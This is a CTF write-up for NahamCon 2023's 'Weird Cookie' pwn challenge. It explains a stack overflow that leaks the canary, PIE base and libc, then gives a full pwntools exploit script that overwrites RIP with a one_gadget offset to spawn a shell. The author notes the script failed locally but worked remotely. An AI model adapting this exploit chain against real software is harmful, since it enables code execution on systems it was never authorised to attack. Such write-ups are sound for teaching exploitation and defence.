---
title: Weird Cookie  , NahamCon 2023
author: megachar0x01
date: 2023-06-19
categories: [Pwn, amd64, ctf]
---



## Description : 
it appears that there is a global variable that holds a canary value, and the same canary value is stored on the stack. It's important to note that these hardcoded canary values  vary if Address Space Layout Randomization (ASLR) is enabled.

The program allocates 40 bytes of memory on the stack, which are initialized to zero. However, when the program takes input from the user, it accepts 64 bytes of data and saves it in the 40-byte stack-allocated memory, causing a buffer overflow. Subsequently, the contents of this memory are printed to the screen as a string.

Afterward, the program accepts another input, which also leads to a buffer overflow. This buffer overflow allows the manipulation of the program's control flow, specifically the instruction pointer (RIP) and the base pointer (RBP).

The attack strategy involves leaking values from the stack by inspecting it. By overflowing  null byte '\x00' and using the `puts` function, we can print everything until the next null byte '\x00'. This allows us to leak values from memory, including the canary value and '_IO_2_1_stdout_'. These leaked values help us bypass canary and PIE (Position Independent Executable) protections.

In the subsequent buffer overflow, we overwrite the base pointer (RBP) with a Global Offset Table (GOT) address and the return instruction pointer (RIP) with the address of the main function plus an offset of 112. This enables us to leak the contents of the GOT, revealing addresses of functions in the libc library. We can then utilize the libc address plus the 0x10a2fc onegadget offset to gain a shell.

Note: The provided information is for educational purposes only. Exploitation of vulnerabilities should only be performed in authorized environments and with appropriate permissions.

## Protections: 


<img src="https://i.imgur.com/9NNVGZK.png" alt="img_1">

## Vulnerable Code


<img src="https://i.imgur.com/NRNT04z.png" alt="img_2">



## Exploit

```python
#!/usr/bin/python3
from pwn import *
import struct

# context.terminal = ['tmux','splitw','-h']
os.environ['XDG_CACHE_HOME'] = '/tmp/'

context.log_level = 'error'

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
break *main+221
continue
continue
'''.format(**locals())

exe = './weird_cookie'
elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc
libc_rop = ROP(libc, checksec=False)

io = start()

padd = 40

# Initial payload to trigger overflow
payload = b""
payload += b"A" * padd

io.sendafter(b"Do you think you can overflow me?\n", payload)

io.recvuntil(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")

# Leak the canary and PIE address
leak_raw = io.recvline().strip(b"\n")
leak_canary = u64(leak_raw[0:8])
leak_pie = u64(leak_raw[8:14] + b"\x00" * 2)

print(f"Leaked PIE value: {hex(leak_pie)}")
print(f"Leaked canary: {hex(leak_canary)}")

# Calculate the base address of the binary using the leaked PIE value
elf.address = leak_pie - elf.sym.__libc_csu_init

# Save the leaked canary value
canary = leak_canary

exe_rop = ROP(elf, checksec=False)

# Prepare the payload for the second stage of the attack
payload1 = b""
payload1 += b"A" * padd
payload1 += p64(canary)
payload1 += p64(elf.got.exit + 0x30 + 16 + 8)  # rsp = [rbp-0x30] # rbp (exit+16 = io_stdin)
payload1 += p64(elf.sym.main + 112)  # RIP

io.sendafter(b"Are you sure you overflowed it right? Try again.\n", payload1)

# Leak the address of exit from the GOT
leak_got_exit = u64(io.recvline().strip(b"\n") + b"\x00" * 2)

# Calculate the base address of libc using the leaked GOT address
libc.address = leak_got_exit - libc.sym._IO_2_1_stdout_

print(hex(leak_got_exit))
print(hex(libc.address + 0x4f2a5))

# Prepare the final payload for the third stage of the attack
payload1 = b""
payload1 += b"A" * 56
payload1 += p64(libc.address + 0x10a2fc)

io.sendafter(b"Are you sure you overflowed it right? Try again.\n", payload1)

# Switch to interactive mode to interact with the exploited binary
io.interactive()

```


Note: Due to time constraints, I decided not to pursue the exploit further as it didn't work on my system, although it worked successfully on a remote system.
